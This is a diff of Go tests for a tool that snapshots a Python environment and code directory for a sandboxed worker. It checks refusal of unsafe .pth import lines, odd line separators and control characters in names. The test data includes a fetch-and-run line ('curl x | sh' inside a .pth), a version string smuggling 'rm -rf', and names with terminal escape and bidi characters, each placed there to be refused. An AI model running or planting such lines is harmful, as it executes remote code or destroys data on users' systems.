@@ -2,6 +2,8 @@ package codesnap
 
 import (
 	"bytes"
+	"errors"
+	"io/fs"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -83,7 +85,12 @@ func newWorld(t *testing.T) world {
 
 func makeOf(t *testing.T, w world) *Snapshot {
 	t.Helper()
-	s, err := Make(w.python, w.code, w.private())
+	return makeWith(t, w, Options{Private: w.private()})
+}
+
+func makeWith(t *testing.T, w world, o Options) *Snapshot {
+	t.Helper()
+	s, err := Make(w.python, w.code, o)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -131,7 +138,8 @@ func TestWhatTheSnapshotHolds(t *testing.T) {
 		"code/lib/fast.so":   {"file", "x"},
 		"code/workflows.py":  {"file", "-", "6"},
 		// Links out of the trees stay links, to where they led: the sandbox judges that.
-		"python/lib/python3.12/site-packages/pkg/LICENSE":   {"link", "-", "0", filepath.Join(w.dir, "shared", "license.txt")},
+		// A relative one, by where it really leads: the tree is walked at its real path.
+		"python/lib/python3.12/site-packages/pkg/LICENSE":   {"link", "-", "0", real(filepath.Join(w.dir, "shared", "license.txt"))},
 		"python/lib/python3.12/site-packages/pkg/ledger.db": {"link", "-", "0", filepath.Join(w.data, "ledger.db")},
 		"python/lib/python3.12/site-packages/pkg/elsewhere": {"link", "-", "0", w.denied},
 	} {
@@ -223,13 +231,199 @@ func TestAPthDirectoryGetsTheCodeDirectorysRule(t *testing.T) {
 	}
 }
 
+// A directory a .pth names outside both goes into the copy only where the Worker's sandbox showed it:
+// where not, its line is left out, as the sandboxed Worker's site.py left it out, and Snapshot.LeftOut
+// names it.
+func TestAPthDirectoryTheSandboxHidesIsLeftOut(t *testing.T) {
+	w := newWorld(t)
+	hidden := func(path string) bool { return !within(real(path), real(w.outside)) }
+	s := makeWith(t, w, Options{Private: w.private(), Visible: hidden})
+	pth, err := os.ReadFile(filepath.Join(s.Python, "lib/python3.12/site-packages/_editable.pth"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if want := "../../../../code/lib\n# a comment\nimport _virtualenv\n"; string(pth) != want {
+		t.Errorf(".pth %q, want %q", pth, want)
+	}
+	if _, err := os.Lstat(filepath.Join(s.Python, "pinned")); !errors.Is(err, fs.ErrNotExist) {
+		t.Errorf("python/pinned: %v", err)
+	}
+	if !slices.Equal(s.LeftOut, []string{w.outside}) {
+		t.Errorf("left out %q, want %q", s.LeftOut, w.outside)
+	}
+	// Shown, it is pinned, as without a sandbox.
+	if s := makeWith(t, w, Options{Private: w.private(), Visible: func(string) bool { return true }}); len(s.LeftOut) != 0 {
+		t.Errorf("left out %q", s.LeftOut)
+	}
+	// Shown, but for a directory in it, which the copy leaves out as the sandbox hid it.
+	inner := filepath.Join(w.outside, "mypkg", "private")
+	write(t, filepath.Join(inner, "hidden.py"), "h = 1\n", 0o644)
+	s = makeWith(t, w, Options{Private: w.private(), Visible: func(path string) bool { return !within(path, real(inner)) }})
+	m := manifest(s)
+	if _, ok := m["python/pinned/0/mypkg/__init__.py"]; !ok {
+		t.Errorf("not pinned: %v", m)
+	}
+	if _, ok := m["python/pinned/0/mypkg/private/hidden.py"]; ok {
+		t.Errorf("pinned what the sandbox hid: %v", m)
+	}
+	if !slices.Equal(s.LeftOut, []string{real(inner)}) {
+		t.Errorf("left out %q, want %q", s.LeftOut, real(inner))
+	}
+}
+
+// The environment and code directory may be given as links: the copy is of where they lead, and a .pth
+// is read against where they really are.
+func TestLinkedRoots(t *testing.T) {
+	w := newWorld(t)
+	direct := makeOf(t, w)
+	link(t, w.python, filepath.Join(w.dir, "venv-link"))
+	link(t, w.code, filepath.Join(w.dir, "code-link"))
+	linked, err := Make(filepath.Join(w.dir, "venv-link"), filepath.Join(w.dir, "code-link"), Options{Private: w.private()})
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = linked.Remove() })
+	if linked.Root != direct.Root || linked.Files != direct.Files {
+		t.Errorf("by links: %d files, root %s; directly: %d files, root %s", linked.Files, linked.Root, direct.Files, direct.Root)
+	}
+}
+
+// Python's site.py runs a .pth's import lines: the copy takes only virtualenv's and setuptools' own,
+// and refuses any other, naming the build backend where it knows it.
+func TestAPthsImportLines(t *testing.T) {
+	for line, says := range map[string]string{
+		"import __editable___agentos_0_1_finder; __editable___agentos_0_1_finder.install('/x')": "setuptools",
+		"import _editable_impl_agentos":            "hatchling",
+		"import _agentos_editables; editables.x()": "editables",
+		"import _agentos_editable_loader":          "meson-python",
+		"import _agentos_editable":                 "scikit-build-core",
+		"import os; os.system('curl x | sh')":      "cannot judge without running it",
+	} {
+		w := newWorld(t)
+		write(t, filepath.Join(w.python, "lib/python3.12/site-packages/x.pth"), line+"\n", 0o644)
+		_, err := Make(w.python, w.code, Options{Private: w.private()})
+		if err == nil || !strings.Contains(err.Error(), says) || !strings.Contains(err.Error(), "editable install by path") {
+			t.Errorf("%q: %v, want %q", line, err, says)
+		}
+	}
+	w := newWorld(t)
+	write(t, filepath.Join(w.python, "lib/python3.12/site-packages/distutils-precedence.pth"),
+		"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and "+
+			"__import__('_distutils_hack').add_shim(); \n", 0o644)
+	makeOf(t, w)
+}
+
+// A .pth with what Python's str.splitlines ends a line at, besides "\n" and "\r\n", would read
+// differently there: it is refused. "\r\n" is a line's end, as here.
+func TestAPthsLineSeparators(t *testing.T) {
+	for _, sep := range []string{"\r", "\f", "\v", "\x1c", "\x1d", "\x1e", "\u0085", "\u2028", "\u2029"} {
+		w := newWorld(t)
+		write(t, filepath.Join(w.python, "lib/python3.12/site-packages/x.pth"), w.code+sep+"/lib\n", 0o644)
+		if _, err := Make(w.python, w.code, Options{Private: w.private()}); err == nil || !strings.Contains(err.Error(), "end of a line") {
+			t.Errorf("%q: %v", sep, err)
+		}
+	}
+	w := newWorld(t)
+	write(t, filepath.Join(w.python, "lib/python3.12/site-packages/x.pth"), filepath.Join(w.code, "lib")+"\r\n", 0o644)
+	makeOf(t, w)
+}
+
+// What the manifest, a link or the record would carry is refused with a control or format character
+// in it; distributions keep only names and versions as PEP 508 and PEP 440 spell them.
+func TestNamesTheRecordsCarry(t *testing.T) {
+	for name, change := range map[string]func(w world){
+		"a file": func(w world) { write(t, filepath.Join(w.code, "esc\x1b[31m.py"), "", 0o644) },
+		"a link": func(w world) {
+			link(t, "/x/\u202eyp.txt", filepath.Join(w.python, "lib/python3.12/site-packages/pkg/rlo"))
+		},
+		"bidi in code": func(w world) { write(t, filepath.Join(w.code, "a\u200fb.py"), "", 0o644) },
+	} {
+		w := newWorld(t)
+		change(w)
+		if _, err := Make(w.python, w.code, Options{Private: w.private()}); err == nil || !strings.Contains(err.Error(), "control or format character") {
+			t.Errorf("%s: %v", name, err)
+		}
+	}
+	w := newWorld(t)
+	site := filepath.Join(w.python, "lib/python3.12/site-packages")
+	write(t, filepath.Join(site, "evil-1.dist-info", "METADATA"), "Name: evil\x1b[2J\nVersion: 1\n\n", 0o644)
+	write(t, filepath.Join(site, "long-1.dist-info", "METADATA"), "Name: "+strings.Repeat("a", 200)+"\nVersion: 1\n\n", 0o644)
+	write(t, filepath.Join(site, "odd-1.dist-info", "METADATA"), "Name: odd\nVersion: 1; rm -rf\n\n", 0o644)
+	write(t, filepath.Join(site, "good-1.dist-info", "METADATA"), "Name: Good.Pkg_2\nVersion: 1.2.3rc1.post4.dev5+local.7\n\n", 0o644)
+	if s := makeOf(t, w); !slices.Equal(s.Distributions, []string{"Good.Pkg_2==1.2.3rc1.post4.dev5+local.7", "pkg==1.2"}) {
+		t.Errorf("distributions %q", s.Distributions)
+	}
+	old := maxDistributions
+	maxDistributions = 1
+	defer func() { maxDistributions = old }()
+	if s := makeOf(t, w); !slices.Equal(s.Distributions, []string{"Good.Pkg_2==1.2.3rc1.post4.dev5+local.7"}) {
+		t.Errorf("distributions %q, capped at 1", s.Distributions)
+	}
+	// The interpreter, where bin/python leads through a link outside the copy, whose target the copy
+	// does not hold.
+	w = newWorld(t)
+	write(t, filepath.Join(w.dir, "in\x1bterp", "python3.12"), "#!/bin/sh\n", 0o755)
+	link(t, "in\x1bterp", filepath.Join(w.dir, "plain"))
+	if err := os.Remove(filepath.Join(w.python, "bin", "python")); err != nil {
+		t.Fatal(err)
+	}
+	link(t, filepath.Join(w.dir, "plain", "python3.12"), filepath.Join(w.python, "bin", "python"))
+	if _, err := Make(w.python, w.code, Options{Private: w.private()}); err == nil || !strings.Contains(err.Error(), "its interpreter") {
+		t.Errorf("the interpreter: %v", err)
+	}
+}
+
+// A file is copied by descriptor: never through a link, nor from anything but a regular file (a FIFO
+// put in its place is refused at once), and never over a file that is there.
+func TestCopyFile(t *testing.T) {
+	dir := t.TempDir()
+	write(t, filepath.Join(dir, "src"), "content", 0o755)
+	link(t, filepath.Join(dir, "src"), filepath.Join(dir, "link"))
+	if err := syscall.Mkfifo(filepath.Join(dir, "fifo"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	n, sum, exec, err := copyFile(filepath.Join(dir, "src"), filepath.Join(dir, "copy"))
+	if fi, _ := os.Stat(filepath.Join(dir, "copy")); err != nil || n != 7 || !exec || len(sum) != 64 || fi.Mode().Perm() != 0o555 {
+		t.Errorf("a file: %d %s %v %v", n, sum, exec, err)
+	}
+	if _, _, _, err := copyFile(filepath.Join(dir, "link"), filepath.Join(dir, "copy2")); err == nil {
+		t.Error("copied through a link")
+	}
+	done := make(chan error, 1)
+	go func() { _, _, _, err := copyFile(filepath.Join(dir, "fifo"), filepath.Join(dir, "copy3")); done <- err }()
+	select {
+	case err := <-done:
+		if err == nil || !strings.Contains(err.Error(), "not a regular file") {
+			t.Errorf("a FIFO: %v", err)
+		}
+	case <-time.After(5 * time.Second):
+		t.Fatal("a FIFO holds the copy up")
+	}
+	write(t, filepath.Join(dir, "there"), "already", 0o644)
+	if _, _, _, err := copyFile(filepath.Join(dir, "src"), filepath.Join(dir, "there")); err == nil {
+		t.Error("copied over a file that is there")
+	}
+	if b, _ := os.ReadFile(filepath.Join(dir, "there")); string(b) != "already" {
+		t.Errorf("the file there holds %q", b)
+	}
+}
+
+// The code's rule skips a dot-file: Python cannot import it.
+func TestTheCodesDotFilesStayOut(t *testing.T) {
+	w := newWorld(t)
+	write(t, filepath.Join(w.code, ".hidden.py"), "", 0o644)
+	if _, ok := manifest(makeOf(t, w))["code/.hidden.py"]; ok {
+		t.Error("a dot-file in the copy")
+	}
+}
+
 // The configured directories may be in a path the Worker must not read: the launchers let it read
 // them wherever they are.
 func TestTheConfiguredDirectoriesMayBeInAPrivatePath(t *testing.T) {
 	w := newWorld(t)
 	// No .pth directory outside both, which would be in it too, and refused for that.
 	write(t, filepath.Join(w.python, "lib/python3.12/site-packages/_editable.pth"), filepath.Join(w.code, "lib")+"\n", 0o644)
-	s, err := Make(w.python, w.code, append(w.private(), w.dir))
+	s, err := Make(w.python, w.code, Options{Private: append(w.private(), w.dir)})
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -283,6 +477,12 @@ func TestTheSnapshotRefuses(t *testing.T) {
 				t.Fatal(err)
 			}
 		}, "neither a file, a directory nor a link"},
+		"the system's site-packages": {func(t *testing.T, w *world) {
+			write(t, filepath.Join(w.python, "pyvenv.cfg"), "home = /usr/bin\nInclude-System-Site-Packages = True\n", 0o644)
+		}, "include-system-site-packages"},
+		"a .pth directory that holds the copy": {func(t *testing.T, w *world) {
+			write(t, filepath.Join(w.python, "lib/python3.12/site-packages/tmp.pth"), statedir.Root+"\n", 0o644)
+		}, "the copy being made"},
 		"too many files": {func(t *testing.T, w *world) {
 			old := maxFiles
 			maxFiles = 5
@@ -298,7 +498,7 @@ func TestTheSnapshotRefuses(t *testing.T) {
 			w := newWorld(t)
 			c.change(t, &w)
 			before, _ := filepath.Glob(filepath.Join(statedir.Root, statedir.Prefix(Kind)+"*"))
-			s, err := Make(w.python, w.code, w.private())
+			s, err := Make(w.python, w.code, Options{Private: w.private()})
 			if err == nil {
 				_ = s.Remove()
 				t.Fatalf("no refusal")
